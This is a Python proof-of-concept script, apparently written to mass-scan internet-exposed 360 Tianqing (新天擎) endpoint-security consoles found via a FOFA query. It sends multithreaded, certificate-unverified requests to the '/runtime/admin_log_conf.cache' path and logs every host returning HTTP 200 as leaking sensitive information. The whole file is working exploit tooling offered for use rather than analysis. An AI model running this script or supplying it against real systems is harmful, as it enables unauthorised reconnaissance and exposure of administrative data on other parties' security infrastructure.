# fofa:title="360新天擎"
import sys,requests,os,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    banner()
    parser = argparse.ArgumentParser(description="这是脚本的提示信息")
    parser.add_argument('-u','--url',type=str,help="请输入你的url")
    parser.add_argument('-f','--file',type=str,help="请输入你的url文件")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
def banner():
    test = """
   _____ _____ ____     _   __                _______                   _                ____      ____                           __  _                __               __                  
  |__  // ___// __ \   / | / /__ _      __   /_  __(_)___ _____  ____ _(_)___  ____ _   /  _/___  / __/___  _________ ___  ____ _/ /_(_)___  ____     / /   ___  ____ _/ /______ _____ ____ 
   /_ </ __ \/ / / /  /  |/ / _ \ | /| / /    / / / / __ `/ __ \/ __ `/ / __ \/ __ `/   / // __ \/ /_/ __ \/ ___/ __ `__ \/ __ `/ __/ / __ \/ __ \   / /   / _ \/ __ `/ //_/ __ `/ __ `/ _ \
 ___/ / /_/ / /_/ /  / /|  /  __/ |/ |/ /    / / / / /_/ / / / / /_/ / / / / / /_/ /  _/ // / / / __/ /_/ / /  / / / / / / /_/ / /_/ / /_/ / / / /  / /___/  __/ /_/ / ,< / /_/ / /_/ /  __/
/____/\____/\____/  /_/ |_/\___/|__/|__/    /_/ /_/\__,_/_/ /_/\__, /_/_/ /_/\__, /  /___/_/ /_/_/  \____/_/  /_/ /_/ /_/\__,_/\__/_/\____/_/ /_/  /_____/\___/\__,_/_/|_|\__,_/\__, /\___/ 
                                                                 /_/        /____/                                                                                             /____/       
                                                                                                                    author:heihcao 
                                                                                                                    version:1.0.0
"""
def poc(target):
    url = target + "/runtime/admin_log_conf.cache"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0'
    }
    response = requests.get(url=url,headers=headers,timeout=5,verify=False)
    try:
        if response.status_code == 200:
            with open("result.txt",'a+',encoding='utf-8') as f:
                f.write(target + '\n')
            print(f"[+]{target} 有敏感信息泄露漏洞")
        else:
            print(f"[-]{target} 没有敏感信息泄露漏洞")
    except:
        print(f"[*]{target} server error")

if __name__ == '__main__':
    main()